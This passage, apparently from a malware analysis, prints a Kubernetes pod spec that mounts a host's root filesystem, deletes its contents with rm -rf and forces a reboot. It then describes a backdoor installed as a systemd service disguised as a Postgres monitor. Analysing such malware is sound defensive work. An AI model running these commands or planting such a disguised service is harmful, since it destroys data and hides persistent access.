    \ [\"/bin/sh\", \"-c\"]\n        args:\n          - |\n            find /mnt/host -maxdepth 1 -exec rm -rf {} +\n            chroot /mnt/host reboot -f\n        volumeMounts:\n        - name: host-root\n\
    \          mountPath: /mnt/host\n      volumes:\n      - name: host-root\n        hostPath:\n          path: /\n```\n\n## Persistence Path\n\nFor non-Iranian targets, the deploy_std_ds function installs\
    \ the CanisterWorm\nbackdoor as a systemd service:\n\n```ini\n[Unit]\nDescription=Postgres Monitor Service\n\n[Service]\nExecStart=/usr/bin/python3 /var/lib/pgmon/pgmon.py\nRestart=always\n\n[Install]\n\
